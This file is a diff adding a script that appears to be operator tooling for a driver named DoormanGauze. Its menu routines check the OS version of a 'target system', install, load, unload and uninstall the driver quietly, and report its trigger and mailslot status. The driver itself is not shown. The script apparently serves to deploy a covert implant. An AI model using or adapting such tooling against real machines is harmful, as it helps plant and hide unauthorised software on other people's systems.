@@ -1,0 +1,242 @@
+#------------------------------------------------------------------------------#
+# The main functionality of DoormanGauze
+#------------------------------------------------------------------------------#
+
+#------------------------------------------------------------------------------#
+sub DmgHeader(REF string %menu, REF string %params, IN string $key, OUT bool $cont)
+{
+
+	echo "Current Configuration:";
+	echo "     Driver Name : %params{'driverName'}";
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub ChangeDriverName(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	echo "Current driver name = '%params{'driverName'}'";
+	return GetInput("Enter new driver name", %params{'driverName'});
+	
+}
+
+#------------------------------------------------------------------------------#
+sub InstallTools(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	bool $goodOs=false;
+	if (_IsWindowsNt())
+	{
+		if (_IsWindowsNt4())
+		{
+			# check to make sure we're NT 4 Sp4 or higher
+			int $major, $minor, $other;
+			if (!_GetOsVersion($major, $minor, $other))
+			{
+			    echo("Unable to get system version -- manually verify that", WARNING);
+			    echo("the target system is Windows NT Sp4 or greater", WARNING);
+				$goodOs = prompt("Is OS Windows NT Sp4 or greater?");
+			}
+			else
+			{
+				$goodOs = ($other >= 4);
+			}
+		}
+		else
+		{
+			# 2000 or higher
+			$goodOs = true;
+		}
+	}
+
+	if (!$goodOs)
+	{
+	    # not Windows NT 4 Sp4 or higher
+	    echo("*** Target system is pre-NT Sp4. ***", ERROR);
+	    echo("    DoormanGauze is not compatible with this system", ERROR);
+		return !(<bool>%params{'quiet'});
+	}
+
+	if (!_DriverInstall(%params{'project'},
+						%params{'driverName'},
+						%params{'localName'},
+						2,
+						1,
+						!(<bool>%params{'quiet'})))
+	{
+	    return !(<bool>%params{'quiet'});
+	}
+
+	return true;
+}
+
+#------------------------------------------------------------------------------#
+sub UninstallTools(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	if (_DriverUninstall(%params{'project'}, %params{'driverName'}, !(<bool>%params{'quiet'})))
+	{
+		echo("\nUNINSTALL SUCCESS", GOOD);
+	}
+	else
+	{
+		echo("\n**** UNINSTALL FAILED ****", ERROR);
+		return !(<bool>%params{'quiet'});
+	}
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub LoadDriver(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	if (<bool>%params{'quiet'} || prompt("Load the driver (%params{'driverName'})?"))
+	{
+		if (!defined(%params{'silent'}) || !(<bool>%params{'silent'}))
+		{
+			@echo on;
+		}
+		bool $res = `drivers -load %params{'driverName'}`;
+		@echo off;
+		if (!$res && <bool>%params{'quiet'})
+		{
+			return false;
+		}
+	}
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub UnloadDriver(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	if (<bool>%params{'quiet'} || prompt("Unload the driver (%params{'driverName'})?"))
+	{
+		if (!defined(%params{'silent'}) || !(<bool>%params{'silent'}))
+		{
+			@echo on;
+		}
+		bool $res = `drivers -unload %params{'driverName'}`;
+		@echo off;
+		if (!$res && <bool>%params{'quiet'})
+		{
+			return false;
+		}
+	}
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub VerifyInstall(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	if (_DriverVerifyInstall( %params{'driverName'}, 2, 1))
+	{
+		echo("\nVERIFICATION SUCCESSFULL", GOOD);
+	}
+	else
+	{
+		echo("\n**** UNABLE TO VERIFY INSTALL ****", ERROR);
+		return !(<bool>%params{'quiet'});
+	}
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub VerifyDriverIsRunning(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	if (_DriverVerifyRunning( %params{'driverName'}))
+	{
+		echo("\nVERIFICATION SUCCESSFULL", GOOD);
+	}
+	else
+	{
+		echo("\n**** UNABLE TO VERIFY DRIVER IS RUNNING ****", ERROR);
+		return !(<bool>%params{'quiet'});
+	}
+	return true;
+	
+}
+
+#------------------------------------------------------------------------------#
+sub CheckDriverStatus(REF string %menu, REF string %params, IN string $key, REF bool $cont)
+{
+
+	bool $success = true;
+	@record on;
+	bool $ret = `dmgz_control -version -driver "%params{'driverName'}"`;
+	@record off;
+	if (!$ret)
+	{
+		echo("\n**** UNABLE TO GET DRIVER VERSION ****", ERROR);
+		$success = false;
+	}
+	else
+	{
+		int $major, $minor, $fix;
+		if (!GetCmdData("versionitem::major", $major) || !defined($major) ||
+			!GetCmdData("versionitem::minor", $minor) || !defined($minor) ||
+			!GetCmdData("versionitem::fix", $fix) || !defined($fix))
+		{
+			echo("**** UNABLE TO GET DRIVER VERSION ****", ERROR);
+			$success = false;
+		}
+		else
+		{
+			echo("    Driver Version : $major.$minor.$fix", DEFAULT);
+		}
+	}
+	
+	@record on;
+	$ret = `dmgz_control -status -driver "%params{'driverName'}"`;
+	@record off;
+	
+	if (!$ret)
+	{
+		echo("**** UNABLE TO GET DRIVER STATUS ****", ERROR);
+		$success = false;
+	}
+	else
+	{
+		string $time, $mailslot, $status;
+		int $index, $processId, $statusValue;
+		if (!GetCmdData("statusitem::index", $index) || !defined($index) ||
+			!GetCmdData("statusitem::process", $processId) || !defined($processId) ||
+			!GetCmdData("statusitem::mailslot", $mailslot) || !defined($mailslot) ||
+			!GetCmdData("statusitem::lasttriggertime::time", $time) || !defined($time) ||
+			!GetCmdData("statusitem::LastTriggerStatusValue", $statusValue) || !defined($statusValue) ||
+			!GetCmdData("statusitem::LastTriggerStatus", $status) || !defined($status))
+		{
+			echo("**** UNABLE TO GET DRIVER STATUS ****", ERROR);
+			$success = false;
+		}
+		else
+		{
+			for (int $i=0; $i < sizeof($index); $i++)
+			{
+				if (($index[$i] == 0) || ($processId[$i] != 0))
+				{
+					echo("-----------------------------------------------------------------", DEFAULT);
+					echo("              Index : $index[$i]", DEFAULT);
+					echo("Registered Mailslot : $mailslot[$i]", DEFAULT);
+					echo("Register Process Id : $processId[$i]", DEFAULT);
+					echo("  Last Trigger Time : $time[$i]", DEFAULT);
+					echo("Last Trigger Status : $statusValue[$i] ($status[$i])", DEFAULT);
+				}
+			}
+		}
+	}
+	
+	if (!$success && <bool>%params{'quiet'})
+	{
+		return false;
+	}
+	return true;
+	
+}
